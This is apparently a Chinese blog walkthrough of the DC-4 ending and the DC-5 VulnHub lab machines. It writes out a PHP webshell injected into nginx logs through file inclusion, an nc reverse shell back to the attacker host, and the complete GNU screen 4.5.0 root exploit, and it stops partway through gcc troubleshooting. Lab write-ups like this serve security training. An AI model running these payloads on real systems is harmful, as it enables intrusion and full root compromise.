<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918221800576.png"><img src="/vulnhub/image-20220918221800576.png" alt="image-20220918221800576"></a></p>
<p>发现是管理员，直接到<code>root</code>目录下，查看 <code>flag</code>即可</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918221943297.png"><img src="/vulnhub/image-20220918221943297.png" alt="image-20220918221943297"></a></p>
<blockquote>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">888      <span class="number"> 888 </span>        <span class="number"> 888 </span>888      8888888b.                            <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888   o  <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span> &quot;Y88b                           <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888  d8b <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>                          <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888 d888b<span class="number"> 888 </span> .d88b. <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span> .d88b.  88888b.   .d88b. <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888d88888b888 d8P  Y8b<span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>d88&quot;&quot;88b<span class="number"> 888 </span>&quot;88b d8P  Y8b<span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">88888P Y88888<span class="number"> 88888888 </span>888<span class="number"> 888 </span>    <span class="number"> 888 </span>  <span class="number"> 888 </span>888 <span class="number"> 888 </span>888 <span class="number"> 888 </span>88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.    <span class="number"> 888 </span>888     <span class="number"> 888 </span> .d88P Y88..88P<span class="number"> 888 </span><span class="number"> 888 </span>Y8b.      &quot;   &quot;   &quot;   &quot;  </span><br><span class="line">888P     Y888  &quot;Y8888 <span class="number"> 888 </span>888      8888888P&quot;   &quot;Y88P&quot; <span class="number"> 888 </span><span class="number"> 888 </span> &quot;Y8888 <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br></pre></td></tr></table></figure>

<p><code>Congratulations!!!</code></p>
<p><code>Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those</code><br><code>who have provided feedback, and who have taken time to complete these little</code><br><code>challenges.</code></p>
<p><code>If you enjoyed this CTF, send me a tweet via @DCAU7.</code></p>
<p>意思是<br>恭喜！！！</p>
<p>希望你喜欢 DC-4。只是想向所有这些人表示衷心的感谢<br>谁提供了反馈，谁花时间完成了这些小事<br>挑战。</p>
<p>如果你喜欢这个 CTF，请通过@DCAU7 给我发一条推文。</p>
</blockquote>
<p><strong>一个旗子找完，游戏结束</strong></p>
<hr>
<h1 id="五、DC-5-高级"><a href="#五、DC-5-高级" class="headerlink" title="五、DC-5[高级]"></a>五、DC-5[高级]</h1><p><strong>only one flag</strong></p>
<h2 id="信息收集-4"><a href="#信息收集-4" class="headerlink" title="信息收集"></a>信息收集</h2><p>官方文档里有一些提示说明，我们可以先看一下</p>
<blockquote>
<p><code>As far as I am aware, there is only one exploitable entry point to get in (there is no SSH either). This particular entry point may be quite hard to identify, but it is there. You need to look for something a little out of the ordinary (something that changes with a refresh of a page). This will hopefully provide soKme kind of idea as to what the vulnerability might involve.</code></p>
<p><code>And just for the record, there is no phpmailer exploit involved. :-)</code><br>翻译：<br>据我所知，只有一个可利用的入口点可以进入（也没有 SSH）。这个特定的入口点可能很难识别，但它就在那里。您需要寻找一些与众不同的东西（随着页面的刷新而改变的东西）。这有望为漏洞可能涉及的内容提供某种想法。</p>
<p>只是为了记录，没有涉及 phpmailer 漏洞利用。:-)</p>
<p>&#x3D;&#x3D;&gt;大致关键的信息就是，在我们刷新网页的时候有的东西会发生改变，对应某种漏洞</p>
</blockquote>
<p>养成习惯，先顺手用<code>nmap</code>扫一下靶机端口运行的服务信息</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220923214221504.png"><img src="/vulnhub/image-20220923214221504.png" alt="image-20220923214221504"></a></p>
<p>发现<code>80</code>端口正常运行着<code>http</code>，<code>54235</code>端口打开</p>
<hr>
<p>我们访问<code>192.168.133.143</code></p>
<p>先习惯看看<code>Wappalyzer</code>基本信息</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220930190721316.png"><img src="/vulnhub/image-20220930190721316.png" alt="image-20220930190721316"></a></p>
<p>发现<code>Web server</code>是<code>Nginx</code></p>
<p>发现有5个窗口</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220930190329914.png"><img src="/vulnhub/image-20220930190329914.png" alt="image-20220930190329914"></a></p>
<p>挨个访问，看看有没有可以利用或者交互的地方</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220930185231350.png"><img src="/vulnhub/image-20220930185231350.png" alt="image-20220930185231350"></a></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220930191004048.png"><img src="/vulnhub/image-20220930191004048.png" alt="image-20220930191004048"></a></p>
<p>发现<code>Concat</code>窗口下有个输入框，可以实现交互效果，我们乱输入一些数据先试试</p>
<p>看看变化</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220930191023866.png"><img src="/vulnhub/image-20220930191023866.png" alt="image-20220930191023866"></a></p>
<p>发现<code>url</code>在提交时发生的跳转，并且显示了一些信息</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.133.143</span>/thankyou.php?firstname=<span class="number">1</span>&amp;lastname=<span class="number">2</span>&amp;country=australia&amp;subject=<span class="number">123</span></span><br></pre></td></tr></table></figure>

<p>看得出来，网站跳转到了<code>thankyou.php</code>，而且我们输入的信息也被以明文方式显示出来了</p>
<p>那怎么利用呢？</p>
<p>我们想起之前作者给的提示，说<strong>刷新的时候会发生变化</strong>，我们刷新看看</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220930191944460.png"><img src="/vulnhub/image-20220930191944460.png" alt="image-20220930191944460"></a></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220930191958402.png"><img src="/vulnhub/image-20220930191958402.png" alt="image-20220930191958402"></a></p>
<p>对比两个图可以发现，底下的年份时间发生了改变，<strong>刷新一次，增加一年</strong></p>
<p>这个肯定是有用的，但是怎么利用还是不知道</p>
<p>我们先要了解这个变化肯定是有文件来调用的，而我们肯定是可以访问这个文件的，那我们就需要再次针对性的进行信息收集</p>
<p>用经典的<code>dirsearch</code>来扫一下</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220930193121068.png"><img src="/vulnhub/image-20220930193121068.png" alt="image-20220930193121068"></a></p>
<p>除去我们已经访问过的文件和响应码403的，发现有一个叫做<code>footer.php</code>文件，刚好和我们的发现变化的那个地方一致，也是<code>底部文本</code>变化</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.133.143/footer.php</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220930193446746.png"><img src="/vulnhub/image-20220930193446746.png" alt="image-20220930193446746"></a></p>
<p>发现果然是我们发现变化的那个地方，而且我们刷新时，也会同时变化</p>
<hr>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>所以按上面我们推到的思路，和信息的收集，</p>
<p><code>concat.php</code>的底部为了显示和<code>footer.php</code>的实现功能，肯定是实现了文件包含，</p>
<p><code>concat.php</code>把<code>footer.php</code>文件包含了</p>
<p>&#x3D;&#x3D;&gt;我们渗透的基础思路就变成了<strong>利用的文件包含   拿到shell</strong></p>
<h3 id="1-验证我们的想法"><a href="#1-验证我们的想法" class="headerlink" title="1.验证我们的想法"></a>1.验证我们的想法</h3><p>【文件包含注入点可控参数名一般为<code>file</code>，当然如果出现怎么都不行的，那就可以用<code>爆破</code>**(fuzz)**或者我们的思路错误了】</p>
<p>我们先试试能不能包含<code>index.php</code></p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.133.143/thankyou.php?file=index.php</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220930194734246.png"><img src="/vulnhub/image-20220930194734246.png" alt="image-20220930194734246"></a></p>
<p>发现<code>index.php</code>确实被我们成功包含了，那我们就可以肯定我们的思路是没有偏离了</p>
<h3 id="2-利用文件包含拿shell"><a href="#2-利用文件包含拿shell" class="headerlink" title="2.利用文件包含拿shell"></a>2.利用文件包含拿shell</h3><p>既然能够在<code>thank.php</code>里实现文件包含，那我们就试试能不能包含一些敏感文件，来获取更多信息</p>
<h4 id="1）向Nginx错误日志导入一句话🐎"><a href="#1）向Nginx错误日志导入一句话🐎" class="headerlink" title="1）向Nginx错误日志导入一句话🐎"></a>1）向Nginx错误日志导入一句话🐎</h4><p>根据我们之前收集的信息，</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220930190721316.png"><img src="/vulnhub/image-20220930190721316.png" alt="image-20220930190721316"></a></p>
<p>发现<code>Web server</code>是<code>Nginx</code></p>
<blockquote>
<p>Nginx访问日志：网站访问者有关的活动都记录在访问日志 &#x2F;&#x2F;<code>access_log</code></p>
<p>Nginx错误日志：当访问错误的时候，会把错误参数保存在其中  &#x2F;&#x2F;<code>error_log</code></p>
</blockquote>
<p>所以我们在我们的</p>
<blockquote>
<p><code>url/?file=</code> 的后面加上一句话🐎，<br>然后因为访问错误，错误参数【一句话🐎】就会到<code>nginx的错误日志</code>中，<br>然后利用我们发现的文件包含把错误日记包含在<code>thankyou.php</code>文件中，<br>访问拿到<code>shell</code>，拿到<code>shell</code></p>
</blockquote>
<p><code>nginx</code>配置文件位置：**&#x2F;etc&#x2F;nginx&#x2F;nginx.conf**</p>
<p>我们包含该文件看看<strong>nginx的错误日志文件</strong>位置在哪里</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220930212030059.png"><img src="/vulnhub/image-20220930212030059.png" alt="image-20220930212030059"></a></p>
<p>看到文件位置</p>
<blockquote>
<p><code>error_log：/var/log/nginx/error.log</code></p>
</blockquote>
<p>先输入一句话🐎，报错导入<code>nginx</code>错误日志</p>
<hr>
<p><strong>key</strong>：如果直接在网页输入一句话🐎导入错误日志是有问题的</p>
<blockquote>
<p>当我们访问<code>http://192.168.133.143/thankyou.php?file=&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code></p>
<p>虽然确实把这个信息导入到了 <code>/var/log/nginx/error.log</code> 文件里</p>
<p>但是前端似乎存在过滤，会把&lt;&gt;和’’或””，替换成其他符号，所以当我们想要利用</p>
<p><code>http://192.168.133.143/thankyou.php?file=/var/log/nginx/error.log&amp;cmd=ls</code></p>
<p>这样想利用我们导入的木马拿到shell的时候，实际上我们的木马已经被破坏了，所以根本不能执行我们想要的一系列命令，所以用抓包burp直接发送到服务器，绕过前端过滤先，这样我们的一句话🐎才能发挥它的作用</p>
</blockquote>
<hr>
<p>所以我们执行<strong>抓包操作</strong></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221001221200987.png"><img src="/vulnhub/image-20221001221200987.png" alt="image-20221001221200987"></a></p>
<p>没有其他回显内容</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221001221849004.png"><img src="/vulnhub/image-20221001221849004.png" alt="image-20221001221849004"></a></p>
<p>我们在文件包含<code>/var/log/nginx/error.log</code>，并利用<code>cmd</code>参数执行<code>ls</code>试试，看看是否真的把我们的木马包含进去了</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221001222035413.png"><img src="/vulnhub/image-20221001222035413.png" alt="image-20221001222035413"></a></p>
<p>发现确实成功包含进去了，而且还可以执行命令</p>
<p>那我们直接用<code>nc</code>命令反弹<code>shell</code></p>
<h4 id="2）nc命令反弹shell"><a href="#2）nc命令反弹shell" class="headerlink" title="2）nc命令反弹shell"></a>2）nc命令反弹shell</h4><p>先在<code>kali</code>控制台执行<code>nc</code>监听<code>8888</code>端口</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -l -vv -p <span class="number">8888</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221001223417288.png"><img src="/vulnhub/image-20221001223417288.png" alt="image-20221001223417288"></a></p>
<p>然后网页浏览</p>
<blockquote>
<p><code>http://192.168.133.144/thankyou.php?file=/var/log/nginx/error.log&amp;cmd=nc%20-nv%20192.168.133.140%208888%20-e%20/bin/bash</code></p>
<p>&#x2F;&#x2F;<code>192.168.133.140</code>是虚拟机ip，不是靶机ip</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221001223100801.png"><img src="/vulnhub/image-20221001223100801.png" alt="image-20221001223100801"></a></p>
<p>返回控制台查看</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221001223320410.png"><img src="/vulnhub/image-20221001223320410.png" alt="image-20221001223320410"></a></p>
<p>进入<code>shell</code></p>
<p>然后标准姿势，进入交互式shell</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221001223408282.png"><img src="/vulnhub/image-20221001223408282.png" alt="image-20221001223408282"></a></p>
<h4 id="获得稳定的shell"><a href="#获得稳定的shell" class="headerlink" title="*获得稳定的shell"></a>*获得稳定的shell</h4><p>【不会因为ctrl+c退出，而且可以按上下键，返回之前的命令】</p>
<blockquote>
<p>先在shell，用<code>Ctrl-Z</code>将shell放到后台</p>
<p>再<br><code>stty raw -echo &amp;&amp; fg ; reset</code>  </p>
<p><code>nc -l -vv -p 8888</code>  &#x2F;&#x2F;这个不用输入，是自动执行后台的命令返回到前台</p>
<p>&#x2F;&#x2F;stty 设置终端端口设备的接口选项</p>
<p>&#x2F;&#x2F;echo 表示回显，比如当-echo时，输入ls后按回车，仍然会看到ls</p>
<p>&#x2F;&#x2F;fg把shell提到前台来</p>
<p>&#x2F;&#x2F;reset表示重启终端，此时的终端为我们靶机的shell窗口，所以不容易被退出或者中断</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221002145951718.png"><img src="/vulnhub/image-20221002145951718.png" alt="image-20221002145951718"></a></p>
<p>成功获得全交互式<code>shell</code></p>
<h3 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h3><p>拿到shell以后，我们权限明显是不够的，所以我们需要<strong>垂直提权</strong>，拿到最高权限</p>
<p>先看看存不存在<code>suid</code>方式提权</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221001223927542.png"><img src="/vulnhub/image-20221001223927542.png" alt="image-20221001223927542"></a></p>
<p>似乎没啥可以利用提权的点，但是有个</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221001224134569.png"><img src="/vulnhub/image-20221001224134569.png" alt="image-20221001224134569"></a></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/bin/</span>screen-<span class="number">4.5</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>看起来有点陌生，我们<code>百度/google</code>就要利用起来了</p>
<blockquote>
<p><code>GNU Screen</code>是一款由<code>GNU</code>计划开发的用于命令行终端切换的自由软件。</p>
<p>用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。</p>
<p><code>GNU Screen</code>可以看作是窗口管理器的命令行界面版本。</p>
<p>它提供了统一的管理多个会话的界面和相应的功能。</p>
</blockquote>
<p>看来是属于suid当中的漏洞脚本提权，那脚本怎么找呢</p>
<h4 id="1）searchsploit找提权脚本文件"><a href="#1）searchsploit找提权脚本文件" class="headerlink" title="1）searchsploit找提权脚本文件"></a>1）searchsploit找提权脚本文件</h4><p>我们可以使用<code>searchsploit</code>搜索软件相关漏洞有没有可以利用的脚本，而且它的版本号也写出来了</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221001224602898.png"><img src="/vulnhub/image-20221001224602898.png" alt="image-20221001224602898"></a></p>
<p>发现有两个文件，一个<code>sh脚本</code>文件，一个<code>txt文本</code>的（POC）</p>
<p>看到有<code>sh脚本</code>文件路径，先查看其内容是什么，看看能不能利用</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221001224718080.png"><img src="/vulnhub/image-20221001224718080.png" alt="image-20221001224718080"></a></p>
<p>发现是个<code>c语言脚本</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221001224923228.png"><img src="/vulnhub/image-20221001224923228.png" alt="image-20221001224923228"></a></p>
<p>看来我们找的是正确的，我们分析一下该脚本文件，看看怎么利用其来提权</p>
<blockquote>
<p>仔细看其实这里面有两个C语言脚本</p>
<p>【<code>EOF</code>为文结束符号】</p>
<p>而且需要保存到两个c文件中去<br><code>libhax.c</code><br><code>rootshell.c</code></p>
<p>然后用gcc命令<br><code>gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</code><br><code>gcc -o /tmp/rootshell /tmp/rootshell.c</code></p>
<p>对两个c文件进行编译，从而生成<br><code>libhax.so</code><br><code>rootshell</code></p>
<p>然后在把两个c文件和两个编译后生成的文件传入靶机后</p>
<p>在靶机shell挨个执行后面的命令，从而拿到root权限</p>
<p><code>echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</code><br><code>cd /etc</code><br><code>umask 000 # because</code><br><code>screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</code><br><code>echo &quot;[+] Triggering...&quot;</code><br><code>screen -ls # screen itself is setuid, so... /tmp/rootshell</code>                            </p>
</blockquote>
<p>上半部分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="type">void</span> <span class="title function_">dropshell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221002124640256.png"><img src="/vulnhub/image-20221002124640256.png" alt="image-20221002124640256"></a></p>
<p>下半部分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221002124701995.png"><img src="/vulnhub/image-20221002124701995.png" alt="image-20221002124701995"></a></p>
<p><strong>&#x3D;&#x3D;&gt;</strong></p>
<p>我们需要在靶机的&#x2F;tmp目录下，传入</p>
<blockquote>
<p><code>libhax.so</code><br><code>rootshell</code><br><code>flag.sh</code>   &#x2F;&#x2F;内容为后面的命令内容</p>
</blockquote>
<p>这三个文件</p>
<p>我们先在自己的<code>kali</code>机上把这两个文件准备好</p>
<p>我们也可以先到我们<code>kali</code>机的<code>/tmp</code>目录下</p>
<p>先执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="type">void</span> <span class="title function_">dropshell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221002124843966.png"><img src="/vulnhub/image-20221002124843966.png" alt="image-20221002124843966"></a></p>
<p>再执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt; /tmp/rootshell.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line">rm -f /tmp/rootshell.c</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221002124900295.png"><img src="/vulnhub/image-20221002124900295.png" alt="image-20221002124900295"></a></p>
<p>【虽然会报错，但是是正常的，不影响编译后产生的文件的执行】</p>
<p>执行后</p>
<blockquote>
<p><code>libhax.so  rootshell</code><br>这两个文件就生成了</p>
</blockquote>
<p>然后我们的<code>flag.sh</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -<span class="built_in">ls</span> <span class="comment"># screen itself is setuid, so...</span></span><br><span class="line">/tmp/rootshell </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221002134454968.png"><img src="/vulnhub/image-20221002134454968.png" alt="image-20221002134454968"></a></p>
<h4 id="2）nc向靶机传入脚本提权文件"><a href="#2）nc向靶机传入脚本提权文件" class="headerlink" title="2）nc向靶机传入脚本提权文件"></a>2）nc向靶机传入脚本提权文件</h4><p><code>当然如果你用蚁剑连接的shell的话，直接把文件拖进去就行，简单一点</code></p>
<p>如果用nc的话当然也不难</p>
<p>先是<code>kali</code>机控制台【目前状态为<code>/tmp</code>下】</p>
<blockquote>
<p><code>nc -lvp 8888 &lt; libhax.so</code>  &#x2F;&#x2F; &lt; 表示传入</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221001233201455.png"><img src="/vulnhub/image-20221001233201455.png" alt="image-20221001233201455"></a></p>
<p>靶机<code>shell</code>【必须在<code>/tmp</code>目录下才能执行nc】</p>
<blockquote>
<p><code>cd /tmp</code><br><code>nc 192.168.133.140 8888 &gt; libhax.so</code>  &#x2F;&#x2F;&gt;表示传出接收文件,192.168.133.140为kali机ip</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221001233223666.png"><img src="/vulnhub/image-20221001233223666.png" alt="image-20221001233223666"></a></p>
<p>看到传入成功</p>
<p><code>rootshell</code>和<code>flag.sh</code>文件类似，不再展示</p>
<p>最后成功传入</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221002132325197.png"><img src="/vulnhub/image-20221002132325197.png" alt="image-20221002132325197"></a></p>
<h4 id="3）执行脚本进行提权"><a href="#3）执行脚本进行提权" class="headerlink" title="3）执行脚本进行提权"></a>3）执行脚本进行提权</h4><hr>
<p>传入完成后，给<code>flag.sh</code>加上执行权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x flag.sh</span><br></pre></td></tr></table></figure>

<p>然后执行即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./flag.sh</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="出现意外"><a href="#出现意外" class="headerlink" title="*出现意外"></a>*<strong>出现意外</strong></h5><p><a data-fancybox="gallery" data-src="/vulnhub/image-20221002173352619.png"><img src="/vulnhub/image-20221002173352619.png" alt="image-20221002173352619"></a></p>
<p>不知道有没有朋友也遇到这种报错</p>
<p>最后一步执行<code>rootshell</code>的时候，弹出这个命令，我搜索了一下，猜测是不是c语言脚本写错了，但是仔细检查并没有出错</p>
<p>然后我们看了看我们的<code>kali</code>和<code>靶机</code>的gcc版本</p>
<p>发现</p>
<blockquote>
<p>kali机是：<code>11.3.0-1</code></p>
<p>靶机是：<code>4.9.2</code></p>
</blockquote>
<p>但是编译器不同对结果应该没什么太大影响</p>
<p>但我还是试试能不能在<code>靶机的shell</code>里执行gcc，运行两个c语言脚本文件，得到<code>rootshell</code>和<code>libhax.so</code>文件</p>
<p>但是又出现</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221002210307317.png"><img src="/vulnhub/image-20221002210307317.png" alt="image-20221002210307317"></a></p>
<p>原来是缺少环境变量，导致无法执行</p>
<h6 id="给cc1配置环境变量"><a href="#给cc1配置环境变量" class="headerlink" title="给cc1配置环境变量"></a>给<code>cc1</code>配置环境变量</h6><p><a data-fancybox="gallery" data-src="/vulnhub/image-20221002205950588.png"><img src="/vulnhub/image-20221002205950588.png" alt="image-20221002205950588"></a></p>
